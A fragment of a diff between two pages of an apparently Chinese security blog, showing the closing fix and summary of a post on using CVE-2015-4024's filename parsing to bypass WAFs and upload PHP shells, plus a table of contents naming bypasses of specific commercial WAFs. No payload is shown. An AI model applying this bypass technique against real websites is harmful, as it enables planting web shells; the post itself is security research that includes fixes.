+<h2 id="5-2-修复方案二"><a href="#5-2-修复方案二" class="headerlink" title="5.2 修复方案二"></a>5.2 修复方案二</h2><p>兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。</p>
+<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.     总结"></a>6.     总结</h1><p>本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。</p>
 
       
     </div>
@@ -520,8 +506,6 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           
             <a href="/tags/Hacker/" rel="tag"># Hacker</a>
           
-            <a href="/tags/Tools/" rel="tag"># Tools</a>
-          
         </div>
       
 
@@ -533,8 +517,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/05/31/ciztyc5d90000iwvqqonpbcj8.html" rel="next" title="discuz 不能上传头像提示can not write to the data/tmp folder">
-                <i class="fa fa-chevron-left"></i> discuz 不能上传头像提示can not write to the data/tmp folder
+              <a href="/2016/09/24/ciztyiyu6001lqkvq9ny3b0kv.html" rel="next" title="基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网">
+                <i class="fa fa-chevron-left"></i> 基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网
               </a>
             
           </div>
@@ -543,8 +527,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/06/09/ciztyc5ey001tiwvqvfgmpakv.html" rel="prev" title="编码转换工具">
-                编码转换工具 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/09/25/ciztyiytm0011qkvq8cow0hrp.html" rel="prev" title="WAF攻防研究之四个层次Bypass WAF">
+                WAF攻防研究之四个层次Bypass WAF <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -560,10 +544,10 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/06/08/ciztyc5dq0007iwvq448vi5hf.html"
-     data-title="MetInfo V5.1 GetShell一键化工具"
+        <div class="ds-share flat" data-thread-key="2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html"
+     data-title="PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed"
      data-content=""
-     data-url="http://hacktech.cn/2016/06/08/ciztyc5dq0007iwvq448vi5hf.html">
+     data-url="http://akkuman.coding.me/2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -590,8 +574,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/06/08/ciztyc5dq0007iwvq448vi5hf.html"
-           data-title="MetInfo V5.1 GetShell一键化工具" data-url="http://hacktech.cn/2016/06/08/ciztyc5dq0007iwvq448vi5hf.html">
+      <div class="ds-thread" data-thread-key="2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html"
+           data-title="PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed" data-url="http://akkuman.coding.me/2016/09/24/ciztyiyt6000fqkvq9xyd58ei.html">
       </div>
     
   </div>
@@ -782,7 +766,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞解析："><span class="nav-number">1.</span> <span class="nav-text">漏洞解析：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件命名方式："><span class="nav-number">1.1.</span> <span class="nav-text">文件命名方式：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一键化利用工具："><span class="nav-number">2.</span> <span class="nav-text">一键化利用工具：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件说明"><span class="nav-number">3.</span> <span class="nav-text">文件说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#下载地址："><span class="nav-number">4.</span> <span class="nav-text">下载地址：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-背景介绍"><span class="nav-number">1.</span> <span class="nav-text">1.     背景介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-绕过WAF的原理"><span class="nav-number">2.</span> <span class="nav-text">2.     绕过WAF的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF绕过payload"><span class="nav-number">2.1.</span> <span class="nav-text">WAF绕过payload:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传功能测试脚本："><span class="nav-number">2.2.</span> <span class="nav-text">文件上传功能测试脚本：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-绕过WAF实战"><span class="nav-number">3.</span> <span class="nav-text">3.     绕过WAF实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-绕过360网站卫士"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 绕过360网站卫士</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"><span class="nav-number">3.1.1.</span> <span class="nav-text">步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。"><span class="nav-number">3.1.2.</span> <span class="nav-text">步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-绕过知道创宇加速乐"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 绕过知道创宇加速乐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"><span class="nav-number">3.2.1.</span> <span class="nav-text">步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤二：成功绕过加速乐，上传shell，文件是syt-php。"><span class="nav-number">3.2.2.</span> <span class="nav-text">步骤二：成功绕过加速乐，上传shell，文件是syt.php。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-绕过百度云加速"><span class="nav-number">3.3.</span> <span class="nav-text">3.3. 绕过百度云加速</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"><span class="nav-number">3.3.1.</span> <span class="nav-text">步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤二：成功绕过云加速"><span class="nav-number">3.3.2.</span> <span class="nav-text">步骤二：成功绕过云加速</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-扩展—更多的工作"><span class="nav-number">4.</span> <span class="nav-text">4.     扩展—更多的工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-分析filename其他字符的绕过"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 分析filename其他字符的绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-分析其他应用脚本语言"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 分析其他应用脚本语言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-修复方案"><span class="nav-number">5.</span> <span class="nav-text">5.     修复方案</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-修复方案一"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 修复方案一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-修复方案二"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 修复方案二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-总结"><span class="nav-number">6.</span> <span class="nav-text">6.     总结</span></a></li></ol></div>
             
 
           </div>
